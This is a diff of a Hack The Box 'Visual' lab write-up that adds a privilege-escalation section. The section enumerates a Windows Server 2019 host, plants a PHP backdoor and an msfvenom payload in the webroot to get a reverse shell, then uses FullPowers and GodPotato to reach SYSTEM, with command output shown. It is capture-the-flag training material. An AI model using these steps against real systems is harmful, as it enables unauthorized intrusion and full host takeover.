@@ -1,7 +1,7 @@
 # HTB - Visual
 ### TL;DR
 
-### 1. Service enumeration
+### PHASE 1. Service enumeration
 Launch a port scan with `nmap`
 ```markdown
 nmap $target -p- -T4 -Pn --open --reason
@@ -169,7 +169,112 @@ Start another python http serving powercat.ps1 and start a listener on port 1919
 <br>
 <br>
 <br>
-### 3. System
+### PHASE 3. System
+Enumerate the system.
+```markdown
+systeminfo
+
+Host Name:                 VISUAL
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+System Type:               x64-based PC
+```
+Enumerate current user privileges.
+```markdown
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+After enumeration, we discover we have write access to webroot folder, so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Check who is running the http service
+```markdown
+wmic service where started=true get name,startname
+
+Name                    StartName                    
+ApacheHTTPServer        NT AUTHORITY\Local Service   
+BFE                     NT AUTHORITY\LocalService    
+BrokerInfrastructure    LocalSystem                  
+camsvc                  LocalSystem                  
+CDPSvc                  NT AUTHORITY\LocalService
+```
+The user is `ApacheHTTPServer`, who is `nt authority\local service`. Copy a `simple-backdoor.php` and a `.exe` msfvenom payload into the webroot folder (download with certutil). Then start a listener and execute the `.exe` payload server side using a browser and the `simple-backdoor.php`. A reverse shell for user `nt authority\local service` is received on the listener.
+Enumerate ApacheHTTPService user's permissions
+```markdown
+whoami
+nt authority\local service
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` on local service account, check impersonation privilege is restored.
+```markdown
+fp.exe
+[+] Started dummy thread with id 2388
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.4851]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+```
+Once we have impersonation privilege, we can try all range of potatoes. The one working is god potato. We need another msfvenom shell to execute with god potato.
+```markdown
+godpotato-net4.exe -cmd "cmd /c shell.exe"
+[*] CombaseModule: 0x140716178145280
+[*] DispatchTable: 0x140716180451440
+[*] UseProtseqFunction: 0x140716179827616
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\31962564-9378-49a1-bceb-caf0e761bab8\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00000802-1194-ffff-78e9-866782c9261c
+[*] DCOM obj OXID: 0x1824f813e9024d03
+[*] DCOM obj OID: 0x5c3d6b4cfc42b15a
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 852 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2932
+```
+A system shell is received on listener.
 
 
 
